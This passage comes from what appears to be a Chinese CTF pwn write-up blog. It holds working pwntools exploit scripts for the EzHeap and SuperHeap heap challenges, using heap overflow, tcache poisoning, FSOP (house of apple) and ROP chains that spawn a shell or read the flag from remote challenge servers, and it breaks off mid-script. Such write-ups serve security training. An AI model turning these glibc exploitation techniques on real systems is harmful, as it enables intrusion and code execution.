class="hljs-number">1</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(i, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>add(<span class="hljs-number">7</span>, p64((heap_base+<span class="hljs-number">0xe0</span>)^((heap_base+<span class="hljs-number">0x2000</span>)&gt;&gt;<span class="hljs-number">12</span>)))<br><br>add(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">8</span>, p64(<span class="hljs-number">0</span>) + p64(heap_base+<span class="hljs-number">0x10</span>))<br><br>pay = p64(<span class="hljs-number">0x0000000000000000</span>) + p64(<span class="hljs-number">0x700070000</span>)<br>pay = pay.ljust(<span class="hljs-number">0xa8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]) + p64(heap_base+<span class="hljs-number">0xc0</span>) + p64(<span class="hljs-number">0</span>)<br><br>no_action(pay)<br>pay = p64(<span class="hljs-number">0xfbad1887</span>) + p64(libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]+<span class="hljs-number">131</span>)*<span class="hljs-number">3</span> + p64(libc.sym[<span class="hljs-string">&#x27;_environ&#x27;</span>]) + p64(libc.sym[<span class="hljs-string">&#x27;_environ&#x27;</span>]+<span class="hljs-number">8</span>)<br>pay += p64(libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]+<span class="hljs-number">131</span>)*<span class="hljs-number">2</span> + p64(libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]+<span class="hljs-number">132</span>)<br>pay = pay.ljust(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>no_action(pay)<br>stack = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>pay = p64(stack - <span class="hljs-number">0x608</span>)<br>pay = pay.ljust(<span class="hljs-number">0x70</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>no_action(pay)<br><br><br>leak(<span class="hljs-string">&quot;stack&quot;</span>, stack)<br>leak(<span class="hljs-string">&quot;heap&quot;</span>, heap_base)<br><br><br>pop_rdi = <span class="hljs-number">0x000000000002a3e5</span> + libc.address<br>ret = <span class="hljs-number">0x0000000000029139</span> + libc.address<br>pay =p64(<span class="hljs-number">0</span>) + p64(pop_rdi) + p64(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))) + p64(ret) + p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br>pay = pay.ljust(<span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>no_action(pay)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="EzHeap"><a href="#EzHeap" class="headerlink" title="EzHeap"></a>EzHeap</h2><p>orw的有溢出的2.35</p><p>house of apple一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> bookProto_pb2<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>flag = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;8.147.131.196&#x27;</span>, <span class="hljs-number">42913</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./EzHeap&quot;</span>)<br><br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, data</span>):<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    sla(<span class="hljs-string">b&#x27;:&#x27;</span>, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, size, data</span>):<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    sla(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    sa(<span class="hljs-string">b&#x27;:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    add(<span class="hljs-number">0x300</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br><br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">0</span>, <span class="hljs-number">0x310</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x308</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">0</span>)<br>ru(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x8</span>)<br>heap_base = u64(rc(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="hljs-number">12</span><br><br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x310</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x308</span> + p64(<span class="hljs-number">0x311</span>))<br>add(<span class="hljs-number">0x300</span>,<span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">0x300</span>,<span class="hljs-string">b&#x27;aaa&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    delete(i)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x300</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br><br>edit(<span class="hljs-number">0</span>, <span class="hljs-number">0x310</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x308</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">0</span>)<br>ru(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x8</span>)<br><br>libc.address = u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))  - <span class="hljs-number">0x21ace0</span><br>leak(<span class="hljs-string">&quot;libc&quot;</span>, libc.address)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x310</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x308</span> + p64(<span class="hljs-number">0x311</span>))<br><br>add(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>delete(<span class="hljs-number">11</span>)<br>delete(<span class="hljs-number">10</span>)<br>delete(<span class="hljs-number">9</span>)<br><br>edit(<span class="hljs-number">7</span>, <span class="hljs-number">0x58</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x48</span> + p64(<span class="hljs-number">0x51</span>) + p64((libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]-<span class="hljs-number">0x30</span>)^((heap_base-<span class="hljs-number">0x2000</span>)&gt;&gt;<span class="hljs-number">12</span>)))<br><br>_IO_file_addr = heap_base + <span class="hljs-number">0x1260</span><br>add(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x30</span> + p64(_IO_file_addr))<br><br>_IO_wfile_jumps = libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>setcontext = libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br><br>pop_rdi = libc.address + <span class="hljs-number">0x000000000002a3e5</span><br>pop_rsi = libc.address + <span class="hljs-number">0x000000000002be51</span><br>pop_rdx_r12 = libc.address + <span class="hljs-number">0x000000000011f2e7</span><br>pop_rax = libc.address + <span class="hljs-number">0x0000000000045eb0</span><br>ret = libc.address + <span class="hljs-number">0x00000000000f9b02</span><br>syscall_ret = libc.address + <span class="hljs-number">0x0000000000091316</span><br>magic = <span class="hljs-number">0x0000000000167420</span> + libc.address<br><br>_fake_wide_data_addr = heap_base + <span class="hljs-number">0xf50</span><br>rop_addr = heap_base+<span class="hljs-number">0xc40</span><br><br>_IO_file = p64(<span class="hljs-number">0</span>) + p64(rop_addr)<br>_IO_file = _IO_file.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>_IO_file += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>)<br>_IO_file = _IO_file.ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>_IO_file += p64(_fake_wide_data_addr)<br>_IO_file = _IO_file.ljust(<span class="hljs-number">0xd8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>_IO_file += p64(_IO_wfile_jumps)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(_IO_file), _IO_file)<br><br>wide_data = <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0xe0</span><br>wide_data += p64(_fake_wide_data_addr + <span class="hljs-number">0xe0</span>)<br>wide_data += <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x60</span> + p64(magic)<br>edit(<span class="hljs-number">2</span>, <span class="hljs-built_in">len</span>(wide_data), wide_data)<br><br>rop = <span class="hljs-string">b&#x27;flag\x00\x00&#x27;</span><br>rop = rop.ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>rop += p64(setcontext + <span class="hljs-number">61</span>)<br>rop = rop.ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>rop += p64(rop_addr + <span class="hljs-number">0xb0</span>) + p64(ret)<br>rop += p64(pop_rdi) + p64(rop_addr)<br>rop += p64(pop_rsi) + p64(<span class="hljs-number">0</span>)<br>rop += p64(pop_rax) + p64(<span class="hljs-number">2</span>)<br>rop += p64(syscall_ret)<br><span class="hljs-comment">#read</span><br>rop += p64(pop_rdi) + p64(<span class="hljs-number">3</span>)<br>rop += p64(pop_rsi) + p64(rop_addr + <span class="hljs-number">0x400</span>)<br>rop += p64(pop_rdx_r12) + p64(<span class="hljs-number">0x50</span>) + p64(<span class="hljs-number">0</span>)<br>rop += p64(pop_rax) + p64(<span class="hljs-number">0</span>)<br>rop += p64(syscall_ret)<br><span class="hljs-comment">#write</span><br>rop += p64(pop_rdi) + p64(<span class="hljs-number">1</span>)<br>rop += p64(pop_rsi) + p64(rop_addr + <span class="hljs-number">0x400</span>)<br>rop += p64(pop_rdx_r12) + p64(<span class="hljs-number">0x50</span>) + p64(<span class="hljs-number">0</span>)<br>rop += p64(pop_rax) + p64(<span class="hljs-number">1</span>)<br>rop += p64(syscall_ret)<br><br>edit(<span class="hljs-number">3</span>, <span class="hljs-built_in">len</span>(rop), rop)<br>leak(<span class="hljs-string">&quot;heap_base&quot;</span>, heap_base)<br><br>sla(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="SuperHeap"><a href="#SuperHeap" class="headerlink" title="SuperHeap"></a>SuperHeap</h2><p>哪个好人想出来的protobuf + base32 + base64</p><p>也是存在堆溢出，逆明白输入格式就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> bookProto_pb2<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>flag = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;8.147.134.47&#x27;</span>, <span class="hljs-number">38396</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./SuperHeap&quot;</span>)<br><br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>message = bookProto_pb2.CTFBook()<br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx, title=<span class="hljs-string">b&#x27;&#x27;</span>, author=<span class="hljs-string">b&#x27;&#x27;</span>, isbn=<span class="hljs-string">b&#x27;&#x27;</span>,publish_data=<span class="hljs-string">b&#x27;&#x27;</span>, price = <span class="hljs-number">0</span>,stock = <span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">global</span> payload<br>    sla(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    message.title = base64.b64encode(title)<br>    message.author = base64.b64encode(author)<br>    message.isbn = base64.b64encode(isbn)<br>    message.publish_date = base64.b64encode(publish_data)<br>    message.price = price<br>    message.stock = stock<br>    payload = message.SerializeToString()<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>, base64.b32encode(payload))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>(<span class="hljs-params">data</span>):<br>    sla(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>, base64.b64encode(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, title=<span class="hljs-string">b&#x27;&#x27;</span>, author=<span class="hljs-string">b&#x27;&#x27;</span>, isbn=<span class="hljs-string">b&#x27;&#x27;</span>,publish_data=<span class="hljs-string">b&#x27;&#x27;</span>, price = <span class="hljs-number">0</span>,stock = <span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">global</span> payload<br>    sla(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    message.title = base64.b64encode(title)<br>    message.author = base64.b64encode(author)<br>    message.isbn = base64.b64encode(isbn)<br>    message.publish_date = base64.b64encode(publish_data)<br>    message.price = price<br>    message.stock = stock<br>    payload = message.SerializeToString()<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>, base64.b32encode(payload))<br><br>add(<span class="hljs-number">0</span>, title=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>, author=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x20</span>, isbn=<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">0x20</span>, publish_data=<span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">1</span>, title=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>, author=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x20</span>, isbn=<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">0x20</span>, publish_data=<span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">0x20</span>)<br>delete(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>,publish_data=<span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">0x68</span>+<span class="hljs-string">b&#x27;e&#x27;</span>*<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">0</span>)<br><br>ru(<span class="hljs-string">b&#x27;e&#x27;</span>*<span class="hljs-number">8</span>)<br>heap_base = (u64(rc(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="hljs-number">12</span>) - <span class="hljs-number">0x3000</span><br><br><br>edit(<span class="hljs-number">0</span>,publish_data=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x28</span> + p64(<span class="hljs-number">0x41</span>) + p64(heap_base+<span class="hljs-number">0x37d0</span>)+p64(heap_base+<span class="hljs-number">0x3800</span>)+p64(heap_base+<span class="hljs-number">0x3830</span>)+p64(heap_base+<span class="hljs-number">0x3860</span>)<br>     +<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x31</span>))<br><span class="hljs-comment"># search(b&#x27;e&#x27;*8)</span><br><br>add(<span class="hljs-number">1</span>, title=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>, author=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x20</span>, isbn=<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">0x20</span>, publish_data=<span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">2</span>, title=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>, author=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x30</span>, isbn=<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">0x30</span>, publish_data=<span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">3</span>, title=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>, author=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x30</span>, isbn=<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">0x30</span>, publish_data=<span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">4</span>, title=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>, author=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x30</span>, isbn=<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">0x30</span>, publish_data=<span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">5</span>, title=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>, author=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x30</span>, isbn=<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">0x30</span>, publish_data=<span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">0x30</span>)<br>delete(<span class="hljs-number">5</span>)<br>delete(<span 